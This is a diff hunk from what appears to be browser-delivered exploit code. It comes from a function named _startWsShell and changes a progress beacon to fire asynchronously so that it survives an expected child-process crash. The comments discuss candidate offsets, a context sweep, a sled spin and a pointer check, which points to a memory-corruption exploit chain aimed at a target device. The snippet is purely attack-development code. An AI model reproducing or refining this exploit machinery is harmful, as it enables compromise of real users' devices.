@@ -5730,7 +5730,12 @@ function _startWsShell(){
          * the sub-0x2C0 candidates: 0x130 (#1) / 0x230 (#4) - the
          * zeroed-ctx sweep survivors (mc_cs=0 -> EINVAL ✓). */
         if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
-        function TC(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TWC-'+s),false);x.send();}catch(e){}}
+        function TC(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('TWC-'+s),true);x.send();}catch(e){}}
+        /* THE ASYNC BEACON: fire-and-forget - the request bytes queue
+         * in the kernel socket buffer in ~µs; a process death CANNOT
+         * unsend a queued TCP segment. The child's ~2.3ms sled spin
+         * covers the async send 100-fold. The tid witness banks
+         * server-side even if the child crash kills the reply. */
         try{
           var cfr=S.cfr;
           if(!cfr||cfr<0x400000000n){reply.err='No cfr';break;}
